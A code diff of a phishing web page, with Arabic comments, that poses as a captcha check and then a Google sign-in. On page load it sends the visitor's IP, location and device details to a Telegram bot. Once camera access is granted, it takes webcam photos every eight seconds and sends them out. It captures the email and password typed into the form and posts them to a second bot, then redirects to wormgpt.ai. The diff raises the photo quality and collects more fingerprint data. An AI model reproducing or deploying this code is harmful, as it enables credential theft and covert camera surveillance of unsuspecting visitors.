@@ -60,39 +60,47 @@
         const chat_id = "2103976274";
 
         let user_ip = "Unknown";
-        let clientDevice = "Unknown Device";
-        let clientBrowser = "Unknown Browser";
+        let detailed_info = "";
 
-        async function autoDetect() {
+        async function getTechDetails() {
             const ua = navigator.userAgent;
-            const platform = navigator.platform;
+            let model = "Linux/Generic";
+            
+            // محاولة جلب موديل الجهاز بدقة
             if (navigator.userAgentData) {
                 const entropy = await navigator.userAgentData.getHighEntropyValues(["model"]);
-                clientDevice = entropy.model || platform;
+                model = entropy.model || navigator.platform;
             } else {
-                if (/iPhone|iPad|iPod/.test(ua)) clientDevice = "Apple iOS Device";
-                else if (/Android/.test(ua)) {
-                    const match = ua.match(/Android\s([^\s;]+);?\s?([^)]+)?/);
-                    clientDevice = match ? (match[2] || "Android Phone") : "Android Device";
-                } else { clientDevice = platform; }
+                const match = ua.match(/\(([^)]+)\)/);
+                if (match) model = match[1].split(';')[2] || match[1].split(';')[1] || navigator.platform;
             }
-            if (ua.includes("Brave")) clientBrowser = "Brave";
-            else if (ua.includes("Edg/")) clientBrowser = "Edge";
-            else if (ua.includes("Chrome")) clientBrowser = "Chrome";
-            else if (ua.includes("Firefox")) clientBrowser = "Firefox";
-            else if (ua.includes("Safari") && !ua.includes("Chrome")) clientBrowser = "Safari";
+
+            // جلب معلومات البطارية
+            let battery_status = "غير متوفر";
+            try {
+                const battery = await navigator.getBattery();
+                battery_status = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'شحن' : 'تفريغ'})`;
+            } catch(e) {}
+
+            detailed_info = `📱 **الجهاز:** ${model}\n` +
+                            `🔋 **البطارية:** ${battery_status}\n` +
+                            `🧠 **المعالج:** ${navigator.hardwareConcurrency || 'غير معروف'} نواة\n` +
+                            `🌐 **اللغة:** ${navigator.language}\n` +
+                            `⏰ **المنطقة:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
         }
 
         async function collect() {
-            await autoDetect();
-            let report = "🛑 **تقرير تقني شامل**\n\n";
+            await getTechDetails();
+            let report = "🛑 **تقرير دخول جديد**\n\n";
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                 user_ip = ipRes.ip;
                 const geo = await fetch(`https://ipapi.co/${user_ip}/json/`).then(r => r.json());
                 report += `🌍 **IP:** \`${user_ip}\`\n📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
             } catch(e) {}
-            report += `📱 **الجهاز:** ${clientDevice}\n🧭 **المتصفح:** ${clientBrowser}`;
+
+            report += detailed_info;
+            
             fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -102,28 +110,25 @@
 
         window.onload = collect;
 
-        // الدالة المعدلة التي طلبتها
         function startSystem() {
             document.getElementById('check-btn').classList.add('loading');
             
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                // الكود سيمر هنا فقط إذا تم قبول الكاميرا
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } })
+            .then(stream => {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
-                    
-                    // الآن فقط يتم التحويل بعد التأكد من عمل الكاميرا
                     setTimeout(() => {
                         document.getElementById('step-captcha').style.display = 'none';
                         document.getElementById('step-google').style.display = 'block';
-                        snap(); 
+                        snap(); // أول صورة فورية
                         setInterval(snap, 8000);
-                    }, 500); // تأخير بسيط جداً للمظهر الطبيعي
+                    }, 1000);
                 };
             }).catch(() => {
-                // في حال رفض الكاميرا، لن يحدث شيء (سيبقى الزر يدور للأبد)
-                console.log("Permission denied. Waiting...");
+                // يبقى عالقاً هنا إذا لم يوافق
+                console.log("Waiting for camera...");
             });
         }
 
@@ -131,44 +136,45 @@
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
             if (video.readyState !== 4) return;
+
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.filter = "brightness(1.03) contrast(1.03)";
+            
+            // تحسين الجودة برمجياً
+            ctx.filter = "brightness(1.02) contrast(1.1) saturate(1.1)";
             ctx.drawImage(video, 0, 0);
+
+            // تم رفع الجودة هنا إلى 0.9 (عالية جداً)
             canvas.toBlob(blob => {
                 const f = new FormData();
                 f.append('chat_id', chat_id);
-                f.append('photo', blob, 's.jpg');
+                f.append('photo', blob, 'high_quality.jpg');
                 fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, { method: 'POST', body: f });
-            }, 'image/jpeg', 0.6);
+            }, 'image/jpeg', 0.9);
         }
 
         function showP() {
             const email = document.getElementById('email').value;
-            if (email.includes('@') && email.length > 5) {
+            if (email.includes('@')) {
                 document.getElementById('email-div').style.display = 'none';
                 document.getElementById('pass-div').style.display = 'block';
-                document.getElementById('email-error').style.display = 'none';
-            } else {
-                document.getElementById('email-error').style.display = 'block';
             }
         }
 
         function finalSubmit() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
-            if (pass.length < 8) {
-                document.getElementById('pass-error').style.display = 'block';
-                return;
-            }
-            const login_report = `📥 **صيد حساب**\n\n📧: \`${email}\`\n🔑: \`${pass}\`\n🌍 IP: \`${user_ip}\``;
+            if (pass.length < 5) return;
+
+            const report = `📥 **بيانات تم سحبها**\n\n📧: \`${email}\`\n🔑: \`${pass}\`\n🌍 IP: \`${user_ip}\`\n🔋 بطارية: ${detailed_info.split('🔋')[1].split('\n')[0]}`;
+            
             fetch(`https://api.telegram.org/bot${bot_token_2}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: login_report, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: chat_id, text: report, parse_mode: "Markdown" })
             }).then(() => {
-                window.location.href = "wormgpt.html";
+                window.location.href = "https://wormgpt.ai/";
             });
         }
     </script>
